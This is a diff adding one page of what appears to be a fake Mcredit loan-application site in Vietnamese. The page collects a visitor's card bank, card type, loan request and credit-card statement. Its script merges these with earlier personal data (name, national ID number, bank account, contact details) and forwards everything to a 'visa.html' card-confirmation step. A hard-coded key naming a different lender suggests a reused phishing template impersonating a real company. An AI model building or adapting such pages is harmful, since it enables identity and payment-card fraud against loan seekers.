@@ -1,0 +1,507 @@
+﻿<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes, viewport-fit=cover">
+    <script src="../js/desktop-scale.js"></script>
+    <script src="../js/index-image-cdn.js"></script>
+    <title>Mcredit - Vay theo sao kê thẻ tín dụng</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Be+Vietnam+Pro:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="loan-mobile.css">
+    <style>
+        :root {
+            --primary-color: #141ed2;
+            --primary-dark: #0a1080;
+            --primary-light: #eef0ff;
+            --accent-color: #00b4fa;
+            --text-color: #292929;
+            --bg-light: #f4f6ff;
+        }
+        body { font-family: 'Be Vietnam Pro', sans-serif; background: var(--bg-light); color: var(--text-color); }
+        #site-header {
+            background: #fff;
+            box-shadow: 0 2px 16px rgba(20, 30, 210, 0.08);
+            padding: 12px 0;
+        }
+        #site-header .header-inner {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 0 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        #site-header .brand-tagline {
+            font-size: 12px;
+            color: var(--accent-color);
+            font-weight: 600;
+            margin: 0;
+        }
+        .hero-mcredit {
+            position: relative;
+            max-width: 900px;
+            margin: 0 auto 24px;
+            padding: 0 16px;
+            border-radius: 16px;
+            overflow: hidden;
+            box-shadow: 0 8px 32px rgba(10, 16, 128, 0.18);
+        }
+        .hero-mcredit img {
+            width: 100%;
+            height: auto;
+            display: block;
+            min-height: 120px;
+            object-fit: cover;
+        }
+        .hero-mcredit .overlay {
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(90deg, rgba(10, 16, 128, 0.88) 0%, rgba(20, 30, 210, 0.5) 60%, transparent 100%);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            padding: 28px 32px;
+            color: #fff;
+        }
+        .hero-mcredit .overlay .tagline { color: var(--accent-color); font-size: 13px; font-weight: 600; margin-bottom: 6px; }
+        .hero-mcredit .overlay h1 { font-size: 1.4rem; font-weight: 700; margin: 0 0 8px; line-height: 1.3; }
+        .hero-mcredit .overlay p { margin: 0; font-size: 0.92rem; opacity: 0.95; max-width: 480px; }
+        .steps {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin: 0 auto 24px;
+            max-width: 900px;
+            padding: 0 16px;
+            flex-wrap: wrap;
+        }
+        .step {
+            flex: 1;
+            min-width: 100px;
+            text-align: center;
+            font-size: 11px;
+            font-weight: 600;
+            padding: 10px 8px;
+            border-radius: 999px;
+            background: #e8ebff;
+            color: #5a62b8;
+        }
+        .step.active {
+            background: linear-gradient(135deg, #0a1080 0%, #141ed2 45%, #4a54e8 100%);
+            color: #fff;
+            box-shadow: 0 4px 14px rgba(20, 30, 210, 0.25);
+        }
+        .step.completed {
+            background: #fff;
+            color: var(--primary-color);
+            border: 1px solid rgba(20, 30, 210, 0.25);
+        }
+        .step.active::after { display: none; }
+        .main-container {
+            max-width: 900px;
+            margin: 0 auto 50px;
+            background: #fff;
+            padding: 28px;
+            border-radius: 16px;
+            box-shadow: 0 8px 32px rgba(20, 30, 210, 0.08);
+            border: 1px solid rgba(20, 30, 210, 0.06);
+        }
+        .stat-cards { display: grid; grid-template-columns: repeat(3, 1fr); gap: 16px; margin-bottom: 24px; }
+        .stat-card { background: linear-gradient(135deg, var(--primary-light) 0%, #f5f6ff 100%); border: 1px solid rgba(20, 30, 210, 0.2); border-radius: 12px; padding: 20px; text-align: center; }
+        .stat-card .value { font-size: 22px; font-weight: 700; color: var(--primary-color); margin-bottom: 4px; }
+        .stat-card .label { font-size: 13px; color: #666; margin: 0; }
+        .nav-tabs .nav-link { color: #666; font-weight: 600; border: none; border-bottom: 3px solid transparent; }
+        .nav-tabs .nav-link.active { color: var(--primary-color); border-bottom-color: var(--primary-color); background: transparent; }
+        .info-list li { margin-bottom: 8px; }
+        .advantage-item { display: flex; gap: 12px; margin-bottom: 16px; }
+        .advantage-item i { color: var(--primary-color); font-size: 20px; margin-top: 4px; }
+        .step-flow { display: flex; flex-wrap: wrap; gap: 12px; }
+        .step-flow .flow-item { flex: 1; min-width: 140px; background: #f8f9fa; border-radius: 10px; padding: 16px; text-align: center; border: 1px solid #eee; }
+        .step-flow .num { display: inline-flex; width: 32px; height: 32px; align-items: center; justify-content: center; background: var(--primary-color); color: #fff; border-radius: 50%; font-weight: 700; margin-bottom: 8px; }
+        .calc-box { background: var(--primary-light); border: 1px solid rgba(20, 30, 210, 0.2); border-radius: 12px; padding: 24px; }
+        .calc-result { font-size: 20px; font-weight: 700; color: var(--primary-color); }
+        .form-section-title { color: var(--primary-color); font-weight: 700; margin: 24px 0 16px; font-size: 18px; border-bottom: 1px solid #eee; padding-bottom: 10px; }
+        .btn-next {
+            width: 100%;
+            background: linear-gradient(135deg, #0a1080 0%, #141ed2 45%, #4a54e8 100%);
+            border: none;
+            padding: 15px;
+            font-weight: 700;
+            border-radius: 999px;
+            color: white;
+            margin-top: 20px;
+            box-shadow: 0 4px 14px rgba(20, 30, 210, 0.3);
+            letter-spacing: 0.02em;
+        }
+        .btn-next:hover { color: #fff; opacity: 0.95; transform: translateY(-1px); }
+        .form-select, .form-control { border-radius: 10px; border-color: rgba(20, 30, 210, 0.2); }
+        .form-select:focus, .form-control:focus { border-color: var(--primary-color); box-shadow: 0 0 0 3px rgba(20, 30, 210, 0.12); }
+        .page-footer { text-align: center; padding: 20px 16px 40px; font-size: 13px; color: #666; }
+        .page-footer strong { color: var(--primary-color); }
+        .upload-zone { border: 2px dashed rgba(20, 30, 210, 0.35); border-radius: 12px; padding: 24px; text-align: center; background: #fafbff; cursor: pointer; }
+        .upload-zone.has-file { border-color: var(--primary-color); background: var(--primary-light); }
+        .card-info-panel { background: #f8fcff; border: 1px solid #b3e8fc; border-radius: 12px; padding: 20px; margin-bottom: 8px; }
+        .card-info-panel .form-label { font-weight: 600; }
+        @media (max-width: 767px) { .stat-cards { grid-template-columns: 1fr; } }
+        .text-primary { color: var(--primary-color) !important; }
+    </style>
+</head>
+<body>
+    <header id="site-header">
+        <div class="header-inner">
+            <div>
+                <a href="../index.html"><img src="../image/logo-mcredit.svg" alt="Mcredit" style="height: 40px; object-fit: contain;"></a>
+                <p class="brand-tagline mb-0 mt-1">Khi bạn cần</p>
+            </div>
+            <nav>
+                <a href="step2.html" class="text-decoration-none small" style="color:#141ed2;font-weight:600"><i class="fas fa-arrow-left me-1"></i> Quay lại</a>
+            </nav>
+        </div>
+    </header>
+
+    <div class="hero-mcredit">
+        <img src="../image/promo-loan.svg" alt="Mcredit - Vay theo sao kê thẻ tín dụng">
+        <div class="overlay">
+            <span class="tagline">Khi bạn cần</span>
+            <h1>Vay theo sao kê thẻ tín dụng</h1>
+            <p>Điền thông tin và tải sao kê thẻ — Mcredit hỗ trợ bạn nhanh chóng &amp; an toàn</p>
+        </div>
+    </div>
+
+    <div class="steps">
+        <div class="step completed">✓ Thông tin</div>
+        <div class="step completed">✓ Khoản vay</div>
+        <div class="step active">Sao kê thẻ</div>
+        <div class="step">Xác nhận thẻ</div>
+    </div>
+
+    <div class="container px-0">
+        <div class="main-container">
+            <h2 class="h4 fw-bold text-primary mb-2">Đăng ký vay theo sao kê</h2>
+            <p class="text-muted mb-4">Sử dụng sao kê thẻ tín dụng làm hồ sơ — không yêu cầu tài sản thế chấp.</p>
+
+            <div class="stat-cards">
+                <div class="stat-card">
+                    <div class="value">Từ 42%/năm</div>
+                    <p class="label">Lãi suất</p>
+                </div>
+                <div class="stat-card">
+                    <div class="value">100 triệu</div>
+                    <p class="label">Hạn mức vay</p>
+                </div>
+                <div class="stat-card">
+                    <div class="value">6–36 tháng</div>
+                    <p class="label">Kỳ hạn linh hoạt</p>
+                </div>
+            </div>
+
+            <ul class="nav nav-tabs mb-4" id="productTabs" role="tablist">
+                <li class="nav-item" role="presentation">
+                    <button class="nav-link active" id="tab-info" data-bs-toggle="tab" data-bs-target="#panel-info" type="button">Thông tin khoản vay</button>
+                </li>
+                <li class="nav-item" role="presentation">
+                    <button class="nav-link" id="tab-advantages" data-bs-toggle="tab" data-bs-target="#panel-advantages" type="button">Ưu điểm</button>
+                </li>
+                <li class="nav-item" role="presentation">
+                    <button class="nav-link" id="tab-steps" data-bs-toggle="tab" data-bs-target="#panel-steps" type="button">Các bước vay</button>
+                </li>
+                <li class="nav-item" role="presentation">
+                    <button class="nav-link" id="tab-calc" data-bs-toggle="tab" data-bs-target="#panel-calc" type="button">Cách tính khoản vay</button>
+                </li>
+            </ul>
+
+            <div class="tab-content mb-4">
+                <div class="tab-pane fade show active" id="panel-info">
+                    <h3 class="h5 fw-bold">Sản phẩm dành cho khách hàng</h3>
+                    <ul class="info-list">
+                        <li>Công dân Việt Nam, tuổi 22–60</li>
+                        <li>Đang cư trú tại khu vực triển khai sản phẩm của Mcredit</li>
+                        <li>Sở hữu thẻ tín dụng còn đang hoạt động</li>
+                        <li>Đáp ứng các điều kiện vay tiêu dùng tín chấp theo quy định từng thời kỳ</li>
+                    </ul>
+                    <h3 class="h5 fw-bold mt-4">Hồ sơ vay theo sao kê thẻ tín dụng</h3>
+                    <ul class="info-list">
+                        <li>CCCD/CMND</li>
+                        <li>Màn hình chụp thông tin thuê bao (nếu được yêu cầu)</li>
+                        <li>Chứng từ chứng minh cư trú theo quy định</li>
+                        <li>Sao kê thẻ tín dụng 01 tháng gần nhất (chấp nhận sao kê điện tử)</li>
+                    </ul>
+                </div>
+                <div class="tab-pane fade" id="panel-advantages">
+                    <div class="advantage-item">
+                        <i class="fas fa-chart-line"></i>
+                        <div><strong>Lãi suất ổn định</strong><br><span class="text-muted small">Lãi suất từ 42%/năm duy trì ổn định trong suốt kỳ hạn vay.</span></div>
+                    </div>
+                    <div class="advantage-item">
+                        <i class="fas fa-wallet"></i>
+                        <div><strong>Hạn mức cao</strong><br><span class="text-muted small">Hạn mức lên đến 100 triệu, phù hợp nhu cầu chi tiêu cá nhân.</span></div>
+                    </div>
+                    <div class="advantage-item">
+                        <i class="fas fa-calendar-alt"></i>
+                        <div><strong>Kỳ hạn linh hoạt</strong><br><span class="text-muted small">Từ 6–36 tháng, dễ chọn thời gian trả nợ phù hợp.</span></div>
+                    </div>
+                    <div class="advantage-item">
+                        <i class="fas fa-file-alt"></i>
+                        <div><strong>Thủ tục đơn giản</strong><br><span class="text-muted small">Hồ sơ gọn, xét duyệt nhanh với sao kê thẻ tín dụng.</span></div>
+                    </div>
+                    <div class="advantage-item">
+                        <i class="fas fa-home"></i>
+                        <div><strong>Không thế chấp tài sản</strong><br><span class="text-muted small">Không cần tài sản đảm bảo, thủ tục ngắn gọn hơn.</span></div>
+                    </div>
+                </div>
+                <div class="tab-pane fade" id="panel-steps">
+                    <div class="step-flow">
+                        <div class="flow-item"><span class="num">1</span><div class="small fw-semibold">Điền thông tin &amp; sao kê</div></div>
+                        <div class="flow-item"><span class="num">2</span><div class="small fw-semibold">Mcredit xét duyệt hồ sơ</div></div>
+                        <div class="flow-item"><span class="num">3</span><div class="small fw-semibold">Ký hợp đồng &amp; nhận tiền</div></div>
+                    </div>
+                    <p class="text-muted small mt-3 mb-0">Nhân viên tư vấn sẽ liên hệ trong thời gian sớm nhất sau khi bạn gửi hồ sơ.</p>
+                </div>
+                <div class="tab-pane fade" id="panel-calc">
+                    <div class="calc-box">
+                        <h3 class="h6 fw-bold mb-3">Cách tính khoản vay theo sao kê thẻ tín dụng</h3>
+                        <div class="mb-3">
+                            <label class="form-label">Số tiền vay (VNĐ)</label>
+                            <input type="range" class="form-range" id="calcAmountRange" min="10000000" max="100000000" step="1000000" value="10000000">
+                            <div class="d-flex justify-content-between small text-muted">
+                                <span>10 triệu</span>
+                                <span id="calcAmountLabel" class="fw-bold text-primary">10.000.000 VNĐ</span>
+                                <span>100 triệu</span>
+                            </div>
+                        </div>
+                        <div class="mb-3">
+                            <label class="form-label">Thời hạn vay (tháng)</label>
+                            <select class="form-select" id="calcTermSelect">
+                                <option value="6">6 tháng</option>
+                                <option value="12">12 tháng</option>
+                                <option value="18">18 tháng</option>
+                                <option value="24">24 tháng</option>
+                                <option value="36">36 tháng</option>
+                            </select>
+                        </div>
+                        <p class="mb-1">Khoản trả góp hàng tháng:</p>
+                        <p class="calc-result mb-2" id="calcMonthlyResult">0 VNĐ</p>
+                        <p class="small text-muted mb-0">* Kết quả chỉ mang tính tham khảo, lãi suất tham chiếu 42%/năm.</p>
+                    </div>
+                </div>
+            </div>
+
+            <form id="cardStatementForm" onsubmit="return false;">
+                <h3 class="form-section-title"><i class="fas fa-credit-card me-2"></i>ĐĂNG KÝ VAY THEO SAO KÊ</h3>
+                <p class="small text-muted mb-3">Bước tiếp theo: xác nhận thông tin thẻ (Visa / Mastercard / JCB).</p>
+
+                <div class="row g-3">
+                    <div class="col-md-6">
+                        <label class="form-label">Ngân hàng phát hành thẻ *</label>
+                        <select class="form-select" id="cardBank" required>
+                            <option value="">-- Chọn ngân hàng --</option>
+                            <option value="Vietcombank">Vietcombank</option>
+                            <option value="BIDV">BIDV</option>
+                            <option value="VietinBank">VietinBank</option>
+                            <option value="Agribank">Agribank</option>
+                            <option value="Techcombank">Techcombank</option>
+                            <option value="MB Bank">MB Bank</option>
+                            <option value="ACB">ACB</option>
+                            <option value="VPBank">VPBank</option>
+                            <option value="Sacombank">Sacombank</option>
+                            <option value="HDbank">HDbank</option>
+                            <option value="Khác">Ngân hàng khác</option>
+                        </select>
+                    </div>
+                    <div class="col-md-6">
+                        <label class="form-label">Loại thẻ *</label>
+                        <select class="form-select" id="cardType" required>
+                            <option value="">-- Chọn loại thẻ --</option>
+                            <option value="Visa">Visa</option>
+                            <option value="Mastercard">Mastercard</option>
+                            <option value="JCB">JCB</option>
+                            <option value="American Express">American Express</option>
+                            <option value="Napas">Napas / nội địa</option>
+                        </select>
+                    </div>
+                    <div class="col-md-6">
+                        <label class="form-label">Số tiền vay *</label>
+                        <select class="form-select" id="loanAmount" required>
+                            <option value="">Chọn số tiền</option>
+                            <option value="10000000">10.000.000 VNĐ</option>
+                            <option value="20000000">20.000.000 VNĐ</option>
+                            <option value="30000000">30.000.000 VNĐ</option>
+                            <option value="50000000">50.000.000 VNĐ</option>
+                            <option value="70000000">70.000.000 VNĐ</option>
+                            <option value="100000000">100.000.000 VNĐ</option>
+                        </select>
+                    </div>
+                    <div class="col-md-6">
+                        <label class="form-label">Thời hạn vay *</label>
+                        <select class="form-select" id="loanTerm" required>
+                            <option value="">Chọn kỳ hạn</option>
+                            <option value="6">6 tháng</option>
+                            <option value="12">12 tháng</option>
+                            <option value="18">18 tháng</option>
+                            <option value="24">24 tháng</option>
+                            <option value="36">36 tháng</option>
+                        </select>
+                    </div>
+                    <div class="col-md-6">
+                        <label class="form-label">Lãi suất tham chiếu (%/năm)</label>
+                        <input type="text" class="form-control" id="interestRate" value="42.00" readonly>
+                    </div>
+                    <div class="col-12">
+                        <label class="form-label">Tải sao kê thẻ tín dụng (PDF/JPG/PNG) *</label>
+                        <div class="upload-zone" id="uploadZone">
+                            <input type="file" id="statementFile" accept=".pdf,.jpg,.jpeg,.png" class="d-none" required>
+                            <i class="fas fa-cloud-upload-alt fa-2x text-primary mb-2"></i>
+                            <p class="mb-1 fw-semibold">Bấm để chọn file sao kê</p>
+                            <p class="small text-muted mb-0">Sao kê 01 tháng gần nhất — chấp nhận bản điện tử</p>
+                            <p class="small text-success mt-2 mb-0 d-none" id="fileNameDisplay"></p>
+                        </div>
+                    </div>
+                    <div class="col-12">
+                        <div class="form-check">
+                            <input class="form-check-input" type="checkbox" id="agreeTerms" required>
+                            <label class="form-check-label small" for="agreeTerms">
+                                Tôi xác nhận thông tin sao kê là chính xác và đồng ý cho Mcredit xử lý dữ liệu theo điều khoản sử dụng.
+                            </label>
+                        </div>
+                    </div>
+                </div>
+
+                <button type="button" class="btn btn-next" id="btnSubmit" onclick="finishCardStatement()">
+                    <span id="btnSubmitText">XÁC NHẬN THẺ TÍN DỤNG</span> <i class="fas fa-arrow-right ms-2"></i>
+                </button>
+            </form>
+        </div>
+    </div>
+
+    <footer class="page-footer">
+        <strong>Mcredit</strong> — Hotline <a href="tel:1900636769" style="color:#141ed2;text-decoration:none">1900 63 67 69</a> · www.mcredit.com.vn
+    </footer>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
+    <script>
+        const SECRET_KEY = 'fecredit-secret-key';
+        const CARD_PRODUCT = 'Vay theo sao kê thẻ tín dụng';
+        const ANNUAL_RATE = 42;
+
+        function loadUserData() {
+            const encrypted = localStorage.getItem('userData');
+            if (!encrypted) return null;
+            try {
+                return JSON.parse(CryptoJS.AES.decrypt(encrypted, SECRET_KEY).toString(CryptoJS.enc.Utf8));
+            } catch (e) { return null; }
+        }
+
+        function saveToLocalStorage(partial) {
+            const existing = loadUserData() || {};
+            const merged = Object.assign({}, existing, partial, { timestamp: new Date().toISOString() });
+            localStorage.setItem('userData', CryptoJS.AES.encrypt(JSON.stringify(merged), SECRET_KEY).toString());
+            return merged;
+        }
+
+        function calcMonthlyPayment(amount, months) {
+            const r = ANNUAL_RATE / 100 / 12;
+            const n = parseInt(months, 10);
+            if (!amount || !n) return 0;
+            const pow = Math.pow(1 + r, n);
+            return (amount * r * pow) / (pow - 1);
+        }
+
+        function updateCalculator() {
+            const amount = parseInt(document.getElementById('calcAmountRange').value, 10);
+            const term = document.getElementById('calcTermSelect').value;
+            document.getElementById('calcAmountLabel').textContent = amount.toLocaleString('vi-VN') + ' VNĐ';
+            const monthly = calcMonthlyPayment(amount, term);
+            document.getElementById('calcMonthlyResult').textContent = Math.floor(monthly).toLocaleString('vi-VN') + ' VNĐ';
+        }
+
+        function finishCardStatement() {
+            const form = document.getElementById('cardStatementForm');
+            if (!form.checkValidity()) {
+                form.reportValidity();
+                return;
+            }
+            const fileInput = document.getElementById('statementFile');
+            if (!fileInput.files.length) {
+                alert('Vui lòng tải sao kê thẻ tín dụng.');
+                return;
+            }
+
+            const amount = document.getElementById('loanAmount').value;
+            const term = document.getElementById('loanTerm').value;
+            const monthly = calcMonthlyPayment(parseInt(amount, 10), term);
+
+            const userData = saveToLocalStorage({
+                loanProductName: CARD_PRODUCT,
+                loanType: CARD_PRODUCT,
+                loanFlow: 'card-statement',
+                purpose: CARD_PRODUCT,
+                loanPurpose: CARD_PRODUCT,
+                loanAmount: amount,
+                loanTerm: term,
+                interestRate: ANNUAL_RATE,
+                cardBank: document.getElementById('cardBank').value,
+                cardType: document.getElementById('cardType').value,
+                statementFileName: fileInput.files[0].name,
+                monthlyPayment: monthly,
+                totalRepay: monthly * parseInt(term, 10),
+                currentStep: 2,
+                isRegistered: true
+            });
+
+            sessionStorage.setItem('formData', JSON.stringify({
+                fullName: userData.fullName,
+                cccd: userData.cccd,
+                amount: parseInt(amount, 10).toLocaleString('vi-VN') + ' VNĐ',
+                months: term,
+                accountNumber: userData.accountNumber || '',
+                accountHolder: userData.accountName || userData.fullName || '',
+                phone: userData.phone || '',
+                email: userData.email || '',
+                loanFlow: 'card-statement',
+                cardBank: userData.cardBank,
+                cardType: userData.cardType,
+                statementFileName: userData.statementFileName
+            }));
+
+            window.location.href = 'visa.html';
+        }
+
+        document.addEventListener('DOMContentLoaded', function () {
+            const step1 = loadUserData();
+            if (!step1 || !step1.fullName) {
+                alert('Vui lòng hoàn thành Bước 1 trước.');
+                window.location.href = 'step1.html';
+                return;
+            }
+            if (step1.loanProductName !== CARD_PRODUCT && step1.loanFlow !== 'card-statement') {
+                saveToLocalStorage({ loanProductName: CARD_PRODUCT, loanType: CARD_PRODUCT, loanFlow: 'card-statement' });
+            }
+
+            document.getElementById('calcAmountRange').addEventListener('input', updateCalculator);
+            document.getElementById('calcTermSelect').addEventListener('change', updateCalculator);
+            updateCalculator();
+
+            const zone = document.getElementById('uploadZone');
+            const fileInput = document.getElementById('statementFile');
+            zone.addEventListener('click', function () { fileInput.click(); });
+            fileInput.addEventListener('change', function () {
+                if (fileInput.files.length) {
+                    zone.classList.add('has-file');
+                    const el = document.getElementById('fileNameDisplay');
+                    el.textContent = 'Đã chọn: ' + fileInput.files[0].name;
+                    el.classList.remove('d-none');
+                }
+            });
+
+            if (step1.cardBank) document.getElementById('cardBank').value = step1.cardBank;
+            if (step1.cardType) document.getElementById('cardType').value = step1.cardType;
+            if (step1.loanAmount) document.getElementById('loanAmount').value = step1.loanAmount;
+            if (step1.loanTerm) document.getElementById('loanTerm').value = step1.loanTerm;
+        });
+    </script>
+</body>
+</html>
